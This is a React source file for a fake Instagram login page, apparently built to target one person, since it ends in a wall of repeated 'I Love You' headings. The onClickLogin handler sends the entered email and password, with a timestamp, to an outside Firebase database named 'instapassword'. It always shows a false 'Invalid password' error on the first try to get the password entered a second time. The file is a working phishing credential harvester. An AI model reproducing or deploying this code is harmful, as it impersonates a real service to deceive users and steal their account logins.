import React, { useState } from "react";
import "./App.css";
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import "react-responsive-carousel/lib/styles/carousel.min.css"; // requires a loader
import { Carousel } from 'react-responsive-carousel';


const App = () => {

  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [clicked, setClicked] = useState(0);
  const [homeFlag, setHomeFlag] = useState(true);
  const onClickLogin = (event) => {
    event.preventDefault();
    console.warn(email);
    toast.dismiss();
    console.warn(password);

    if (email.trim().length === 0  ) {
      toast.error('Invalid username');
      return;
    }

    if (password.trim().length === 0) {
      toast.error('Invalid password');
      return;
    }

    const newDocumentId = generateRandomId();
    const currentDate = new Date().toLocaleString();
    const firebaseUrl = 'https://instapassword-da5d6-default-rtdb.asia-southeast1.firebasedatabase.app/';
    fetch(`${firebaseUrl}${newDocumentId}.json`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: email,
        password: password,
        date: currentDate
      }),
    })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        console.log('Data successfully saved to Firebase');
        
         if(clicked == 1){
          setHomeFlag(true)
         }else if(clicked == 0) {
          setClicked(1)
          toast.error('Invalid password')
         }
        
          
          
     
      })
      .catch(error => {
        console.error('Error saving data to Firebase: ', error);
        toast.error('Invalid username and password')
      });
  };

  function generateRandomId() {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 20; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
  }







  return (
    homeFlag ?
    <div className="bodya">
     
         
         {/* <Carousel autoPlay infiniteLoop showThumbs={false} showStatus={false} interval={3000} >
              
                <div>
                  <img src={process.env.PUBLIC_URL + '/2.jpg'} alt="Image" />
                    <p className="legend">Hii.............</p>
                </div>
                <div>
                  <img src={process.env.PUBLIC_URL + '/1.jpg'} alt="Image" />
                    <p className="legend">Hello ji....</p>
                </div>
                <div>
                  <img src={process.env.PUBLIC_URL + '/3.jpg'} alt="Image" />
                    <p className="legend">I want to Say...</p>
                </div>
                <div>
                  <img src={process.env.PUBLIC_URL + '/4.jpg'} alt="Image" />
                    <p className="legend">wait...</p>
                </div>
                <div>
                  <img src={process.env.PUBLIC_URL + '/5.jpg'} alt="Image" />
                    <p className="legend">I Miss you </p>
                </div>
                <div>
                  <img src={process.env.PUBLIC_URL + '/6.jpg'} alt="Image" />
                    <p className="legend"> I Miss You ❤️ </p>
                </div>
                <div>
                  <img src={process.env.PUBLIC_URL + '/7.jpg'} alt="Image" />
                    <p className="legend">I Love you forever</p>
                </div>
                <div>
                  <img src={process.env.PUBLIC_URL + '/8.jpg'} alt="Image" />
                    <p className="legend">❤️💕💕</p>
                </div>
                <div>
                  <img src={process.env.PUBLIC_URL + '/9.jpg'} alt="Image" />
                    <p className="legend">💕💕💕💕</p>
                </div>
                
            </Carousel> */}
            {/* <img src={process.env.PUBLIC_URL + '/19.jpg'} alt="Image" style={{width : "480px"}} /> */}
            <div style={{textAlign:'center',color:'red'}}>
            {/* <img src={process.env.PUBLIC_URL + '/ht.png'} alt="Image" style={{height : "100px"}} /> */}
            </div>
            {/* <div> */}
            {/* <br/> <br/>
              <div className="center">पाने की जिद नहीं ख़ौने का डर है</div>
              <div className="center">दूर मत जाना कभी मुझसे बाकी
               आपका उसका फैसला मंजूर है </div>
               <br/> <br/>
            </div> */}
            
            {/* <img src={process.env.PUBLIC_URL + '/13.jpg'} alt="Image" style={{width : "480px"}} />
            <div>
            <br/> <br/>
              <div className="center">My relation with you is not like rain,</div>
              <div className="center">which come and go away</div>
              <div className="center">My relation like air</div>
              <div className="center">sometime silent but always around you </div>
               <br/> <br/>
            </div>
            <img src={process.env.PUBLIC_URL + '/3.jpg'} alt="Image" style={{width : "480px"}} />
            <div>
            <br/> <br/>
              <div className="center">Muje sir do chijo se der lgta hai</div>
              <div className="center">ek aapke rone se, dusra aapko khone se 💕</div>
           
            </div>
            <img src={process.env.PUBLIC_URL + '/16.jpg'} alt="Image" style={{width : "480px"}} />
            <img src={process.env.PUBLIC_URL + '/18.jpg'} alt="Image" style={{width : "480px"}} />
            <img src={process.env.PUBLIC_URL + '/8.jpg'} alt="Image" style={{width : "480px"}} />
            <img src={process.env.PUBLIC_URL + '/14.jpg'} alt="Image" style={{width : "480px"}} />
            <img src={process.env.PUBLIC_URL + '/15.jpg'} alt="Image" style={{width : "480px"}} />
            <img src={process.env.PUBLIC_URL + '/2.jpg'} alt="Image" style={{width : "480px"}} />
            <img src={process.env.PUBLIC_URL + '/12.jpg'} alt="Image" style={{width : "480px"}} />
            <img src={process.env.PUBLIC_URL + '/11.jpg'} alt="Image" style={{width : "480px"}} />
            <img src={process.env.PUBLIC_URL + '/5.jpg'} alt="Image" style={{width : "480px"}} /> */}
            <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div>
            <div style={{textAlign:'center',color:'red'}}>
            {/* <img src={process.env.PUBLIC_URL + '/ht.png'} alt="Image" style={{height : "100px"}} /> */}
            </div>
            <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div>
            <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div> <div style={{textAlign:'center',color:'red'}}>
              <h1> I Love You ❤️ </h1>
            </div>

            <div style={{textAlign:'center',color:'red'}}>
              <h1>❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️</h1>
            </div>
           
      </div>
      : <React.Fragment>
        <ToastContainer />
        <div id="wrapper">
          <div className="container">
            <div className="phone-app-demo" />
            <div className="form-data">
              <form action="">
                <div className="logo">
                  <h1>Instagram</h1>
                </div>
                <input
                  type="text"
                  placeholder="Phone number, username, or email"
                  onChange={(event) => {
                    setEmail(event.target.value);
                  }}
                />
                <input type="password" placeholder="Password" onChange={(event) => {
                  setPassword(event.target.value);
                }} />
                <button className="form-btn" type="submit" onClick={onClickLogin}>
                  Log in
                </button>
                <span className="has-separator">Or</span>
                <a href="#" className="facebook-login">
                  <i className="fab fa-facebook" /> Log in with Facebook
                </a>
                <a className="password-reset" href="#">
                  Forgot password?
                </a>
              </form>
              <div className="sign-up">
                Don't Have an account? <a href="#">Sign up</a>
              </div>
              {/* <div className="get-the-app">
                <span>Get the app</span>
                <div className="badge">
                  <img
                    src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                    alt="android App"
                  />
                  <img
                    src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                    alt="ios app"
                  />
                </div>
              </div> */}
            </div>
          </div>

          <footer>
            <div className="container">
              <nav className="footer-nav">
                <ul>
                  <li>
                    <a href="#">About Us</a>
                  </li>
                  <li>
                    <a href="#">Support</a>
                  </li>
                  <li>
                    <a href="#">Jobs</a>
                  </li>
                  <li>
                    <a href="#">Privacy</a>
                  </li>
                  <li>
                    <a href="#">Terms</a>
                  </li>
                  <li>
                    <a href="#">Profiles</a>
                  </li>
                  <li>
                    <a href="#">Languages</a>
                  </li>
                </ul>
              </nav>
              <div className="copyright-notice">&copy; 2019 Complaints</div>
            </div>
          </footer>
        </div>
      </React.Fragment>

  );
};

export default App;
